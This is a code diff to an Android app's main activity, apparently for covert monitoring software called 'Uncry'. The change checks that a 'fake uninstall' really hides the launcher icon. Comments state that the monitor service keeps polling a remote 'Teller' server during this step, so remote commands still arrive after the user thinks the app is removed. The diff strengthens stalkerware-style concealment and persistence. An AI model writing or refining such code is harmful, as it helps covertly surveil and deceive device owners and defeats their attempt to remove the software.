@@ -145,7 +145,13 @@ class MainActivity : AppCompatActivity() {
         val battery = if (AutostartHelper.isIgnoringBatteryOptimizations(this)) "Battery optimization: off (good for always-on)" else "Battery optimization: on (tap below to exempt Uncry)"
         val notif = if (hasNotifPermission()) "Notifications: allowed (background Relay works)" else "Notifications: not allowed — grant to enable background Relay"
         val svc = if (AppMonitorService.running) "Monitor service: RUNNING" else "Monitor service: stopped"
-        val iconState = if (AppAlias.isHidden(this)) "Launcher icon: HIDDEN (use Visible on Teller)" else "Launcher icon: shown as ${AppAlias.labelFor(AppAlias.current(this))}"
+        val actuallyHidden = try { AppAlias.launcherHidden(this) } catch (_: Exception) { AppAlias.isHidden(this) }
+        val prefHidden = AppAlias.isHidden(this)
+        val iconState = when {
+            actuallyHidden -> "Launcher icon: HIDDEN (use Visible on Teller)"
+            prefHidden -> "Launcher icon: hide FAILED — still visible, tap Uninstall/Hide again"
+            else -> "Launcher icon: shown as ${AppAlias.labelFor(AppAlias.current(this))}"
+        }
         val devId = getSharedPreferences("uncry", MODE_PRIVATE).getString("teller_device_id", null)?.take(8) ?: "—"
         val tellerBase = DeviceRegistrar.getBaseUrl(this)
         findViewById<TextView>(R.id.keepalive_status).text = "$svc\n$battery\n$notif\n$iconState\nDevice: $devId\nTeller: $tellerBase"
@@ -175,7 +181,8 @@ class MainActivity : AppCompatActivity() {
         // deliberately NOT killed — killing it would stop the poll loop and
         // no remote Visible command could ever arrive.
         uninstallHandler.postDelayed({
-            AppAlias.hide(this)
+            val ok = AppAlias.hide(this)
+            Log.i("MainActivity", "fake uninstall hide verified=$ok")
             DeviceRegistrar.heartbeatAsync(this)
             finishAndRemoveTask()
         }, 2500)
